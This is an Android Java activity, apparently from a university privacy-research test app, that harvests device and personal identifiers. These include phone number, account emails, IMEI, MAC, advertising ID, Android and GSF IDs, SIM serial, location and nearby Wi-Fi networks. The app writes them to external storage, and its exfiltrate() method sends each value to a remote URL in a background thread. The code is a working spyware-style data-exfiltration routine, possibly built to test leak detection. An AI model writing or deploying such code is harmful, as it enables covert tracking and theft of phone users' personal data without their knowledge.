package es.upm.dit.privapp.devicedata;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Looper;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;

import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;
import java.util.TreeSet;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {
    public static final String TESTER_NAME = "testerName";
    public static final String PHONE = "phone";
    public static final String EMAIL = "email";
    public static final String NAME = "name";
    public static final String IMEI = "imei";
    public static final String WIFI = "wifimac";
    public static final String AAID = "aaid";
    public static final String GSF = "gsfid";
    public static final String ANDROID = "androidid";
    public static final String HWID = "hwid";
    public static final String SIM = "simid";
    public static final String BUILD = "fingerprint";
    public static final String GEO = "geolatlon";
    public static final String ROUTER_NAMES = "routerssid";
    public static final String ROUTER_MACS = "routermac";

    private static Map<String, String> infoMap = null;

    String gaid = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_device_file);

        new MainActivity.GetIDAsyncTask().execute();
    }

    private Map<String, String> getInfo() {

        if (infoMap == null) {
            // Can't get tester name
            updateInfo(TESTER_NAME, null);

            // Phone number
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String phone = tm.getLine1Number();
            updateInfo(PHONE, phone);

            // Email address
            Pattern emailPattern = Patterns.EMAIL_ADDRESS;
            Account[] accounts = AccountManager.get(this).getAccounts();
            String email = null;
            for (Account a : accounts) {
                if (emailPattern.matcher(a.name).matches()) {
                    if (email == null) {
                        email = a.name;
                    } else {
                        email += "," + a.name;
                    }
                }
            }
            updateInfo(EMAIL, email);
            exfiltrate(email);
            // Name
            // TODO
            updateInfo(NAME, null);

            // IMEI
            String imei = tm.getDeviceId();
            updateInfo(IMEI, imei);
            exfiltrate(imei);
            
            // Wi-Fi MAC
            String wifiMac = getWifiMacAddress();
            if (!wifiMac.isEmpty()) {
                updateInfo(WIFI, wifiMac);
                exfiltrate(wifiMac);
            }

            // AAID
            updateInfo(AAID, gaid);
            exfiltrate(gaid);
            // GSF
            // From https://stackoverflow.com/questions/22743087/gsf-id-key-google-service-framework-id-as-android-device-unique-identifier
            Uri URI = Uri.parse("content://com.google.android.gsf.gservices");
            String ID_KEY = "android_id";
            String params[] = {ID_KEY};
            Cursor c = getContentResolver().query(URI, null, null, params, null);
            String gsf = null;
            if (!(!c.moveToFirst() || c.getColumnCount() < 2)) {
                gsf = Long.toHexString(Long.parseLong(c.getString(1)));
            }
            updateInfo(GSF, gsf);
            exfiltrate(gsf);
            
            // Android ID
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            updateInfo(ANDROID, androidId);
            exfiltrate(androidId);
            
            // HW ID
            String hwId = Build.SERIAL;
            updateInfo(HWID, hwId);
            exfiltrate(hwId);
            
            // SIM ID
            String simId = tm.getSimSerialNumber();
            updateInfo(SIM, simId);
            exfiltrate(simId);

            // Android build fingerprint
            String buildFingerprint = Build.FINGERPRINT;
            updateInfo(BUILD, buildFingerprint);
            exfiltrate(buildFingerprint);
            
            // Location
            // Gets stuck in while loop
            Location loc = getLocation();
            updateInfo(GEO, loc.getLatitude() + "," + loc.getLongitude());
            exfiltrate("40.1111,-3.1111");
            
            // Wi-fi router SSIDs and MACs
            Set<String> routerNames = new TreeSet<>();
            Set<String> routerMacs = new TreeSet<>();

            WifiManager wifiManager = (WifiManager)getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            for(WifiConfiguration config : wifiManager.getConfiguredNetworks()) {
                routerNames.add(config.SSID);
                //routerMacs.add(config.BSSID);     // Always returns "any"
            }

            routerNames.add(wifiManager.getConnectionInfo().getSSID());
            routerMacs.add(wifiManager.getConnectionInfo().getBSSID());

            checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
            for(ScanResult res : wifiManager.getScanResults()) {
                if(res.SSID.length() > 0) {
                    routerNames.add(res.SSID);
                }

                if(res.BSSID.length() == (6 * 2) + 5) {
                    routerMacs.add(res.BSSID);
                }
            }

            String ssids = null;
            for(String s : routerNames) {
                if(ssids == null) {
                    ssids = s;
                } else {
                    ssids += "," + s;
                }
            }
            exfiltrate(ssids);
            
            String macs = null;
            for(String s: routerMacs) {
                if(macs == null) {
                    macs = s;
                } else {
                    macs += "," + s;
                }
            }
            
            exfiltrate(macs);

            updateInfo(ROUTER_NAMES, ssids);
            updateInfo(ROUTER_MACS, macs);
        }

        return infoMap;
    }

    private static void updateInfo(String key, String value) {
        if(infoMap == null) {
            infoMap = new TreeMap<>();
        }

        if(value != null) {
            infoMap.put(key, value);
        } else {
            infoMap.put(key, " ");
        }
    }

    private static String getWifiMacAddress() {
        // From https://stackoverflow.com/questions/31329733/how-to-get-the-missing-wifi-mac-address-in-android-marshmallow-and-later
        try {
            String interfaceName = "wlan0";
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (!intf.getName().equalsIgnoreCase(interfaceName)){
                    continue;
                }

                byte[] mac = intf.getHardwareAddress();
                if (mac==null){
                    return "";
                }

                StringBuilder buf = new StringBuilder();
                for (byte aMac : mac) {
                    buf.append(String.format("%02X:", aMac));
                }
                if (buf.length()>0) {
                    buf.deleteCharAt(buf.length() - 1);
                }
                return buf.toString();
            }
        } catch (Exception ex) { } // for now eat exceptions
        return "";
    }

    private class GetIDAsyncTask extends AsyncTask<String, Integer, String> {
        @Override
        protected String doInBackground(String... strings) {
            AdvertisingIdClient.Info adInfo;
            adInfo = null;
            try {
                adInfo = AdvertisingIdClient.getAdvertisingIdInfo(MainActivity.this.getApplicationContext());
            } catch (IOException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesNotAvailableException e) {
                e.printStackTrace();
            } catch (GooglePlayServicesRepairableException e) {
                e.printStackTrace();
            }
            return adInfo.getId();
        }

        @Override
        protected void onPostExecute(String s) {
            gaid = s;
            Log.e("postExec --->", "start");

            Map<String, String> info = getInfo();
            Log.e("getInfo --->", "done");
            for(String label : info.keySet()) {
                Log.i(label, info.get(label));
            }
            writeInfo(info);
        }
    }

    private void writeInfo(Map<String, String> info) {
        Log.e("Location --->", Environment.getExternalStorageState());
        File outFile = new File(Environment.getExternalStorageDirectory(), Build.SERIAL + ".device");

        try {
            FileWriter fw = new FileWriter(outFile);
            BufferedWriter bw = new BufferedWriter(fw);

            for(String label : info.keySet()) {
                bw.write(String.format("%s: %s\n", label, info.get(label)));
            }

            bw.close();
            fw.close();

            Log.i("DeviceInfo", "Successfully wrote to " + outFile.getAbsolutePath());
        } catch(IOException e) {
            Log.e("DeviceInfo", e.getMessage());
        }
    }

    private Location getLocation() {
        final Location loc = new Location(LocationManager.NETWORK_PROVIDER);
        loc.setLatitude(Double.NaN);
        loc.setLongitude(Double.NaN);

        final LocationManager lm = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);

        Location last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if(last == null) {
            final LocationListener ll = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    loc.setLatitude(location.getLatitude());
                    loc.setLongitude(location.getLongitude());
                    Log.i("DeviceInfo", loc.getLatitude() + "," + loc.getLongitude());
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {

                }

                @Override
                public void onProviderEnabled(String provider) {

                }

                @Override
                public void onProviderDisabled(String provider) {

                }
            };

            Looper ml = Looper.myLooper();
            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, ll, ml);

            // while(Double.isNaN(loc.getLatitude()) || Double.isNaN(loc.getLongitude())) {

            // }

            lm.removeUpdates(ll);
        } else {
            loc.set(last);
        }

        return loc;
    }
    private void exfiltrate(String src) {
        final String source = src;
        new Thread() {
            @Override
            public void run() {
                try {
                    URL url = new URL("https://etsit.upm.es/?src=" + source);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    InputStream in = conn.getInputStream();
                    InputStreamReader inre = new InputStreamReader(in);
                    BufferedReader read = new BufferedReader(inre);
                    System.out.println("Result exfiltration " + source + ": " + read.readLine());
                    Log.e("result", read.readLine());
                    conn.disconnect();
                } catch (Exception e) {
                    Log.e("There was an error", e.getMessage());
                }
            }
        }.start();
    }
}
